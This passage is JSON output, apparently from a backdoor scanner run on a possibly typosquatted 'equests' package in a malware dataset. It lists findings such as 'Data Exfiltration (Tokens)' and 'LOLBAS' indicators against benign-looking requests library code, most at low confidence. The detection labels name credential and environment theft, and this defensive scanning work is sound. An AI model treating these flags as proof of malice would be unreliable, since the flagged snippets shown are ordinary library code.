                    "text": "        except KeyError:\n            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n\n        return new_proxies\n",
                    "rendered": {
                      "text": "        except KeyError:\n            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n\n        return new_proxies\n",
                      "markdown": "`        except KeyError:\n            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n\n        return new_proxies\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 294,
                  "startColumn": 22,
                  "endLine": 294,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n",
                    "rendered": {
                      "text": "        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n",
                      "markdown": "`        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 292,
                  "startColumn": 22,
                  "endLine": 292,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            del headers['Proxy-Authorization']\n\n        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, password = None, None\n\n",
                    "rendered": {
                      "text": "            del headers['Proxy-Authorization']\n\n        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, password = None, None\n\n",
                      "markdown": "`            del headers['Proxy-Authorization']\n\n        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, password = None, None\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 709,
                  "startColumn": 29,
                  "endLine": 709,
                  "endColumn": 46,
                  "snippet": {
                    "text": "            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n        proxies = merge_setting(proxies, self.proxies)\n",
                    "rendered": {
                      "text": "            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n        proxies = merge_setting(proxies, self.proxies)\n",
                      "markdown": "`            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n        proxies = merge_setting(proxies, self.proxies)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 708,
                  "startColumn": 29,
                  "endLine": 708,
                  "endColumn": 40,
                  "snippet": {
                    "text": "            # Look for requests environment configuration and be compatible\n            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n",
                    "rendered": {
                      "text": "            # Look for requests environment configuration and be compatible\n            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n",
                      "markdown": "`            # Look for requests environment configuration and be compatible\n            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 701,
                  "startColumn": 12,
                  "endLine": 701,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        if self.trust_env:\n            # Set environment's proxies.\n            no_proxy = proxies.get('no_proxy') if proxies is not None else None\n            env_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n            for (k, v) in env_proxies.items():\n                proxies.setdefault(k, v)\n\n",
                    "rendered": {
                      "text": "        if self.trust_env:\n            # Set environment's proxies.\n            no_proxy = proxies.get('no_proxy') if proxies is not None else None\n            env_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n            for (k, v) in env_proxies.items():\n                proxies.setdefault(k, v)\n\n",
                      "markdown": "`        if self.trust_env:\n            # Set environment's proxies.\n            no_proxy = proxies.get('no_proxy') if proxies is not None else None\n            env_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n            for (k, v) in env_proxies.items():\n                proxies.setdefault(k, v)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 21,
                  "endLine": 31,
                  "endColumn": 41,
                  "snippet": {
                    "text": "from .adapters import HTTPAdapter\n\nfrom .utils import (\n    requote_uri, get_environ_proxies, get_netrc_auth, should_bypass_proxies,\n    get_auth_from_url, rewind_body, resolve_proxies\n)\n\n",
                    "rendered": {
                      "text": "from .adapters import HTTPAdapter\n\nfrom .utils import (\n    requote_uri, get_environ_proxies, get_netrc_auth, should_bypass_proxies,\n    get_auth_from_url, rewind_body, resolve_proxies\n)\n\n",
                      "markdown": "`from .adapters import HTTPAdapter\n\nfrom .utils import (\n    requote_uri, get_environ_proxies, get_netrc_auth, should_bypass_proxies,\n    get_auth_from_url, rewind_body, resolve_proxies\n)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 494,
                  "startColumn": 40,
                  "endLine": 494,
                  "endColumn": 48,
                  "snippet": {
                    "text": "            the server's TLS certificate, or a string, in which case it must be a path\n            to a CA bundle to use. Defaults to ``True``. When set to\n            ``False``, requests will accept any TLS certificate presented by\n            the server, and will ignore hostname mismatches and/or expired\n            certificates, which will make your application vulnerable to\n            man-in-the-middle (MitM) attacks. Setting verify to ``False`` \n            may be useful during local development or testing.\n",
                    "rendered": {
                      "text": "            the server's TLS certificate, or a string, in which case it must be a path\n            to a CA bundle to use. Defaults to ``True``. When set to\n            ``False``, requests will accept any TLS certificate presented by\n            the server, and will ignore hostname mismatches and/or expired\n            certificates, which will make your application vulnerable to\n            man-in-the-middle (MitM) attacks. Setting verify to ``False`` \n            may be useful during local development or testing.\n",
                      "markdown": "`            the server's TLS certificate, or a string, in which case it must be a path\n            to a CA bundle to use. Defaults to ``True``. When set to\n            ``False``, requests will accept any TLS certificate presented by\n            the server, and will ignore hostname mismatches and/or expired\n            certificates, which will make your application vulnerable to\n            man-in-the-middle (MitM) attacks. Setting verify to ``False`` \n            may be useful during local development or testing.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 487,
                  "startColumn": 12,
                  "endLine": 487,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        :param allow_redirects: (optional) Set to True by default.\n        :type allow_redirects: bool\n        :param proxies: (optional) Dictionary mapping protocol or protocol and\n            hostname to the URL of the proxy.\n        :param stream: (optional) whether to immediately download the response\n            content. Defaults to ``False``.\n        :param verify: (optional) Either a boolean, in which case it controls whether we verify\n",
                    "rendered": {
                      "text": "        :param allow_redirects: (optional) Set to True by default.\n        :type allow_redirects: bool\n        :param proxies: (optional) Dictionary mapping protocol or protocol and\n            hostname to the URL of the proxy.\n        :param stream: (optional) whether to immediately download the response\n            content. Defaults to ``False``.\n        :param verify: (optional) Either a boolean, in which case it controls whether we verify\n",
                      "markdown": "`        :param allow_redirects: (optional) Set to True by default.\n        :type allow_redirects: bool\n        :param proxies: (optional) Dictionary mapping protocol or protocol and\n            hostname to the URL of the proxy.\n        :param stream: (optional) whether to immediately download the response\n            content. Defaults to ``False``.\n        :param verify: (optional) Either a boolean, in which case it controls whether we verify\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 380,
                  "startColumn": 52,
                  "endLine": 380,
                  "endColumn": 60,
                  "snippet": {
                    "text": "        #: Defaults to `True`, requiring requests to verify the TLS certificate at the\n        #: remote end.\n        #: If verify is set to `False`, requests will accept any TLS certificate\n        #: presented by the server, and will ignore hostname mismatches and/or\n        #: expired certificates, which will make your application vulnerable to\n        #: man-in-the-middle (MitM) attacks.\n        #: Only set this to `False` for testing.\n",
                    "rendered": {
                      "text": "        #: Defaults to `True`, requiring requests to verify the TLS certificate at the\n        #: remote end.\n        #: If verify is set to `False`, requests will accept any TLS certificate\n        #: presented by the server, and will ignore hostname mismatches and/or\n        #: expired certificates, which will make your application vulnerable to\n        #: man-in-the-middle (MitM) attacks.\n        #: Only set this to `False` for testing.\n",
                      "markdown": "`        #: Defaults to `True`, requiring requests to verify the TLS certificate at the\n        #: remote end.\n        #: If verify is set to `False`, requests will accept any TLS certificate\n        #: presented by the server, and will ignore hostname mismatches and/or\n        #: expired certificates, which will make your application vulnerable to\n        #: man-in-the-middle (MitM) attacks.\n        #: Only set this to `False` for testing.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 45,
                  "endLine": 123,
                  "endColumn": 53,
                  "snippet": {
                    "text": "        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n        old_parsed = urlparse(old_url)\n        new_parsed = urlparse(new_url)\n        if old_parsed.hostname != new_parsed.hostname:\n            return True\n        # Special case: allow http -> https redirect when using the standard\n        # ports. This isn't specified by RFC 7235, but is kept to avoid\n",
                    "rendered": {
                      "text": "        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n        old_parsed = urlparse(old_url)\n        new_parsed = urlparse(new_url)\n        if old_parsed.hostname != new_parsed.hostname:\n            return True\n        # Special case: allow http -> https redirect when using the standard\n        # ports. This isn't specified by RFC 7235, but is kept to avoid\n",
                      "markdown": "`        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n        old_parsed = urlparse(old_url)\n        new_parsed = urlparse(new_url)\n        if old_parsed.hostname != new_parsed.hostname:\n            return True\n        # Special case: allow http -> https redirect when using the standard\n        # ports. This isn't specified by RFC 7235, but is kept to avoid\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 22,
                  "endLine": 123,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n        old_parsed = urlparse(old_url)\n        new_parsed = urlparse(new_url)\n        if old_parsed.hostname != new_parsed.hostname:\n            return True\n        # Special case: allow http -> https redirect when using the standard\n        # ports. This isn't specified by RFC 7235, but is kept to avoid\n",
                    "rendered": {
                      "text": "        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n        old_parsed = urlparse(old_url)\n        new_parsed = urlparse(new_url)\n        if old_parsed.hostname != new_parsed.hostname:\n            return True\n        # Special case: allow http -> https redirect when using the standard\n        # ports. This isn't specified by RFC 7235, but is kept to avoid\n",
                      "markdown": "`        \"\"\"Decide whether Authorization header should be removed when redirecting\"\"\"\n        old_parsed = urlparse(old_url)\n        new_parsed = urlparse(new_url)\n        if old_parsed.hostname != new_parsed.hostname:\n            return True\n        # Special case: allow http -> https redirect when using the standard\n        # ports. This isn't specified by RFC 7235, but is kept to avoid\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 767,
                  "startColumn": 48,
                  "endLine": 767,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\n        This method has been deprecated since version 1.0.0 and is only kept for\n        backwards compatibility. New code should use :class:`~requests.sessions.Session`\n        to create a session. This may be removed at a future date.\n\n    :rtype: Session\n    \"\"\"\n",
                    "rendered": {
                      "text": "\n        This method has been deprecated since version 1.0.0 and is only kept for\n        backwards compatibility. New code should use :class:`~requests.sessions.Session`\n        to create a session. This may be removed at a future date.\n\n    :rtype: Session\n    \"\"\"\n",
                      "markdown": "`\n        This method has been deprecated since version 1.0.0 and is only kept for\n        backwards compatibility. New code should use :class:`~requests.sessions.Session`\n        to create a session. This may be removed at a future date.\n\n    :rtype: Session\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 673,
                  "startColumn": 49,
                  "endLine": 673,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n        # Shuffle things around if there's history.\n        if history:\n            # Insert the first (original) request at the start\n            history.insert(0, r)\n            # Get the last request made\n            r = history.pop()\n",
                    "rendered": {
                      "text": "\n        # Shuffle things around if there's history.\n        if history:\n            # Insert the first (original) request at the start\n            history.insert(0, r)\n            # Get the last request made\n            r = history.pop()\n",
                      "markdown": "`\n        # Shuffle things around if there's history.\n        if history:\n            # Insert the first (original) request at the start\n            history.insert(0, r)\n            # Get the last request made\n            r = history.pop()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 377,
                  "startColumn": 79,
                  "endLine": 377,
                  "endColumn": 83,
                  "snippet": {
                    "text": "        self.stream = False\n\n        #: SSL Verification default.\n        #: Defaults to `True`, requiring requests to verify the TLS certificate at the\n        #: remote end.\n        #: If verify is set to `False`, requests will accept any TLS certificate\n        #: presented by the server, and will ignore hostname mismatches and/or\n",
                    "rendered": {
                      "text": "        self.stream = False\n\n        #: SSL Verification default.\n        #: Defaults to `True`, requiring requests to verify the TLS certificate at the\n        #: remote end.\n        #: If verify is set to `False`, requests will accept any TLS certificate\n        #: presented by the server, and will ignore hostname mismatches and/or\n",
                      "markdown": "`        self.stream = False\n\n        #: SSL Verification default.\n        #: Defaults to `True`, requiring requests to verify the TLS certificate at the\n        #: remote end.\n        #: If verify is set to `False`, requests will accept any TLS certificate\n        #: presented by the server, and will ignore hostname mismatches and/or\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 155,
                  "startColumn": 13,
                  "endLine": 155,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        while url:\n            prepared_request = req.copy()\n\n            # Update history and keep track of redirects.\n            # resp.history must ignore the original request in this loop\n            hist.append(resp)\n            resp.history = hist[1:]\n",
                    "rendered": {
                      "text": "        while url:\n            prepared_request = req.copy()\n\n            # Update history and keep track of redirects.\n            # resp.history must ignore the original request in this loop\n            hist.append(resp)\n            resp.history = hist[1:]\n",
                      "markdown": "`        while url:\n            prepared_request = req.copy()\n\n            # Update history and keep track of redirects.\n            # resp.history must ignore the original request in this loop\n            hist.append(resp)\n            resp.history = hist[1:]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 64,
                  "endLine": 101,
                  "endColumn": 68,
                  "snippet": {
                    "text": "    def get_redirect_target(self, resp):\n        \"\"\"Receives a Response. Returns a redirect URI or ``None``\"\"\"\n        # Due to the nature of how requests processes redirects this method will\n        # be called at least once upon the original response and at least twice\n        # on each subsequent redirect response (if any).\n        # If a custom mixin is used to handle this logic, it may be advantageous\n        # to cache the redirect location onto the response object as a private\n",
                    "rendered": {
                      "text": "    def get_redirect_target(self, resp):\n        \"\"\"Receives a Response. Returns a redirect URI or ``None``\"\"\"\n        # Due to the nature of how requests processes redirects this method will\n        # be called at least once upon the original response and at least twice\n        # on each subsequent redirect response (if any).\n        # If a custom mixin is used to handle this logic, it may be advantageous\n        # to cache the redirect location onto the response object as a private\n",
                      "markdown": "`    def get_redirect_target(self, resp):\n        \"\"\"Receives a Response. Returns a redirect URI or ``None``\"\"\"\n        # Due to the nature of how requests processes redirects this method will\n        # be called at least once upon the original response and at least twice\n        # on each subsequent redirect response (if any).\n        # If a custom mixin is used to handle this logic, it may be advantageous\n        # to cache the redirect location onto the response object as a private\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 19,
                  "endLine": 101,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    def get_redirect_target(self, resp):\n        \"\"\"Receives a Response. Returns a redirect URI or ``None``\"\"\"\n        # Due to the nature of how requests processes redirects this method will\n        # be called at least once upon the original response and at least twice\n        # on each subsequent redirect response (if any).\n        # If a custom mixin is used to handle this logic, it may be advantageous\n        # to cache the redirect location onto the response object as a private\n",
                    "rendered": {
                      "text": "    def get_redirect_target(self, resp):\n        \"\"\"Receives a Response. Returns a redirect URI or ``None``\"\"\"\n        # Due to the nature of how requests processes redirects this method will\n        # be called at least once upon the original response and at least twice\n        # on each subsequent redirect response (if any).\n        # If a custom mixin is used to handle this logic, it may be advantageous\n        # to cache the redirect location onto the response object as a private\n",
                      "markdown": "`    def get_redirect_target(self, resp):\n        \"\"\"Receives a Response. Returns a redirect URI or ``None``\"\"\"\n        # Due to the nature of how requests processes redirects this method will\n        # be called at least once upon the original response and at least twice\n        # on each subsequent redirect response (if any).\n        # If a custom mixin is used to handle this logic, it may be advantageous\n        # to cache the redirect location onto the response object as a private\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 647,
                  "startColumn": 23,
                  "endLine": 647,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        # Send the request\n        r = adapter.send(request, **kwargs)\n\n        # Total elapsed time of the request (approximately)\n        elapsed = preferred_clock() - start\n        r.elapsed = timedelta(seconds=elapsed)\n\n",
                    "rendered": {
                      "text": "        # Send the request\n        r = adapter.send(request, **kwargs)\n\n        # Total elapsed time of the request (approximately)\n        elapsed = preferred_clock() - start\n        r.elapsed = timedelta(seconds=elapsed)\n\n",
                      "markdown": "`        # Send the request\n        r = adapter.send(request, **kwargs)\n\n        # Total elapsed time of the request (approximately)\n        elapsed = preferred_clock() - start\n        r.elapsed = timedelta(seconds=elapsed)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 641,
                  "startColumn": 15,
                  "endLine": 641,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        # Get the appropriate adapter to use\n        adapter = self.get_adapter(url=request.url)\n\n        # Start time (approximately) of the request\n        start = preferred_clock()\n\n        # Send the request\n",
                    "rendered": {
                      "text": "        # Get the appropriate adapter to use\n        adapter = self.get_adapter(url=request.url)\n\n        # Start time (approximately) of the request\n        start = preferred_clock()\n\n        # Send the request\n",
                      "markdown": "`        # Get the appropriate adapter to use\n        adapter = self.get_adapter(url=request.url)\n\n        # Start time (approximately) of the request\n        start = preferred_clock()\n\n        # Send the request\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 556,
                  "startColumn": 19,
                  "endLine": 556,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        return self.request('OPTIONS', url, **kwargs)\n\n    def head(self, url, **kwargs):\n        r\"\"\"Sends a HEAD request. Returns :class:`Response` object.\n\n        :param url: URL for the new :class:`Request` object.\n        :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n",
                    "rendered": {
                      "text": "        return self.request('OPTIONS', url, **kwargs)\n\n    def head(self, url, **kwargs):\n        r\"\"\"Sends a HEAD request. Returns :class:`Response` object.\n\n        :param url: URL for the new :class:`Request` object.\n        :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n",
                      "markdown": "`        return self.request('OPTIONS', url, **kwargs)\n\n    def head(self, url, **kwargs):\n        r\"\"\"Sends a HEAD request. Returns :class:`Response` object.\n\n        :param url: URL for the new :class:`Request` object.\n        :param \\*\\*kwargs: Optional arguments that ``request`` takes.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 6,
                  "endLine": 13,
                  "snippet": {
                    "text": "\"\"\"\nimport os\nimport sys\nimport time\nfrom datetime import timedelta\nfrom collections import OrderedDict\n\nfrom .auth import _basic_auth_str\n",
                    "rendered": {
                      "text": "\"\"\"\nimport os\nimport sys\nimport time\nfrom datetime import timedelta\nfrom collections import OrderedDict\n\nfrom .auth import _basic_auth_str\n",
                      "markdown": "`\"\"\"\nimport os\nimport sys\nimport time\nfrom datetime import timedelta\nfrom collections import OrderedDict\n\nfrom .auth import _basic_auth_str\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
